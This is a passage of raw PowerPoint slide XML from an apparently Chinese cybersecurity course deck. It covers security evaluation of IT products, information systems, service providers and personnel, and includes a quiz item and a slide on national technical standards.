            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>B.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="0033CC"/>
                  </a:solidFill>
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>所有者</a:t>
              </a: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2007" y="3037206"/>
              <a:ext cx="1332706" cy="1277341"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="20" name="组合 19"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4894107" y="3049118"/>
            <a:ext cx="1444523" cy="1627930"/>
            <a:chOff x="4927437" y="3050240"/>
            <a:chExt cx="1444523" cy="1627930"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="矩形 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4927437" y="4216505"/>
              <a:ext cx="1423788" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="C00000"/>
                  </a:solidFill>
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>C.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="C00000"/>
                  </a:solidFill>
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>评估者</a:t>
              </a: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72397" y="3050240"/>
              <a:ext cx="1399563" cy="1202225"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="23" name="组合 22"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7058909" y="2907953"/>
            <a:ext cx="1469925" cy="1789381"/>
            <a:chOff x="7159681" y="2979256"/>
            <a:chExt cx="1469925" cy="1789381"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="矩形 5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7159681" y="4306972"/>
              <a:ext cx="1469925" cy="461665"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>D.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:ea typeface="+mn-ea"/>
                </a:rPr>
                <a:t>创造者</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>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97080" y="2979256"/>
              <a:ext cx="1164764" cy="1419669"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28880345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p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="17"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>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p:cTn id="20" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>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p:cTn id="27" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="5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 calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="34" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="23"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="3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F3FC29AC-950A-414E-A6D9-17EF66FAEB86}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>124</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73731" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="739775" y="836712"/>
            <a:ext cx="7740650" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障工作方法</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="内容占位符 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="884920" y="1628800"/>
            <a:ext cx="7450360" cy="3312368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全测评</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解网络空间安全测评的重要性</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解国内外网络空间安全测评概况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解信息产品安全测评方法</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解信息系统安全测评方法</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解服务商资质测评方法</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解网络空间安全人员资质测评方法</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="3600" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33493148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34244" y="721314"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全测评</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="3356992"/>
            <a:ext cx="8191500" cy="2664296"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>测评对象</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>信息产品安全测评</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>信息系统安全测评</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>服务商资质测评</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>网络空间安全人员资质测评</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="矩形 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="533400" y="1484784"/>
            <a:ext cx="7272808" cy="1935915"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="3399FF"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间安全测评</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>依据相关标准，从安全技术、功能、机制等角度对信息技术产品、信息系统、服务提供商以及人员进行测试和评估</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="黑体" pitchFamily="49" charset="-122"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35198266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p:cTn id="33"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62136" y="1146519"/>
            <a:ext cx="4767064" cy="5040560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="图片 2"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1333500" y="1108642"/>
            <a:ext cx="4678660" cy="5070470"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1987422" y="991168"/>
            <a:ext cx="5103812" cy="5310389"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="图片 7"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3066389" y="1116609"/>
            <a:ext cx="4908582" cy="5054536"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="705818"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>国家颁布的技术标准</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38323136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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22"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3E0BFC1A-935E-4452-8C29-AC0235250FFD}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>127</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87043" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="934244" y="1304764"/>
            <a:ext cx="7454180" cy="2268252"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
